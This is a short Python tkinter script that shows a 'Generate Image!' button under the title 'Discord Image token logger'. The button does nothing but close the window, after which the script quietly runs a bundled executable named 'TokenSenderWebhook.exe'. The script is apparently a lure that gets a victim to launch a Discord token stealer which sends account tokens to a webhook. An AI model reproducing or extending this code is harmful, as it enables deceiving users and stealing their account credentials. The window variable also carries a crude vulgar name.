from tkinter import *
import os

nobitches = Tk()

nobitches.geometry("350x350")

nobitches.title("Discord Image token logger")

def close():
   nobitches.quit()

Button(nobitches, text= "Generate Image!", font=("Calibri",14,"bold"), command=close).pack(pady=20)

nobitches.mainloop()

mypath = os.path.abspath(os.path.dirname(__file__))
os.system( f'"{mypath}/TokenSenderWebhook.exe"' )